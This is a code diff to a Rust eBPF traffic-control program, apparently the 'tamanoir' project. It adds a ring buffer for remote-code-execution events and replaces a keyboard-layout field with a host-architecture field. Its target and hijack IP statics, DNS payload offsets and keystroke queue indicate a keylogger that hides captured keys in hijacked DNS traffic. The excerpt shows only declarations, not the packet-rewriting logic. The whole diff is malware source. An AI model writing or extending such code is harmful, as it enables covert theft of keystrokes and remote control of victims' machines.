@@ -1,11 +1,12 @@
 use aya_ebpf::{
     helpers::{bpf_skb_load_bytes, bpf_skb_store_bytes},
     macros::map,
-    maps::Queue,
+    maps::{Queue, RingBuf},
     programs::TcContext,
 };
 use aya_log_ebpf::{debug, error, info};
 use network_types::{eth::EthHdr, ip::Ipv4Hdr};
+use tamanoir_common::RceEvent;
 
 #[no_mangle]
 pub static TARGET_IP: u32 = 0;
@@ -14,7 +15,7 @@ pub static TARGET_IP: u32 = 0;
 pub static HIJACK_IP: u32 = 0;
 
 #[no_mangle]
-pub static KEYBOARD_LAYOUT: u8 = 0;
+pub static ARCH: u8 = 0;
 
 pub const IP_OFFSET: usize = EthHdr::LEN;
 pub const IP_TOT_LEN_OFFSET: usize = IP_OFFSET + 2;
@@ -28,20 +29,21 @@ pub const UDP_CSUM_OFFSET: usize = UDP_OFFSET + 6;
 pub const DNS_QUERY_OFFSET: usize = UDP_OFFSET + 8;
 
 pub const BPF_ADJ_ROOM_NET: u32 = 0;
-
-pub const KEYS_EVENTS_LEN: usize = 4;
-pub const KEYS_PAYLOAD_LEN: usize = 2 * KEYS_EVENTS_LEN;
+pub const KEYS_PAYLOAD_LEN: usize = 8;
 pub const DNS_PAYLOAD_MAX_LEN: usize = 128;
 
-//TODO: define keyboard layout as enum
+//TODO: define host arch as enum
 #[derive(Default, Copy, Clone)]
 #[repr(C)]
 pub struct KeyEvent {
-    pub layout: u8, // 0:qwerty 1: azerty
+    pub arch: u8, // 0:x86_64, 1: aarch64,  2: other
     pub key: u8,
 }
 #[map]
-pub static DATA: Queue<KeyEvent> = Queue::with_max_entries(4096, 0);
+pub static DATA: Queue<u8> = Queue::with_max_entries(4096, 0);
+
+#[map]
+pub static RBUF: RingBuf = RingBuf::with_byte_size(8 * RceEvent::LEN as u32, 0);
 
 pub enum UpdateType {
     Src,
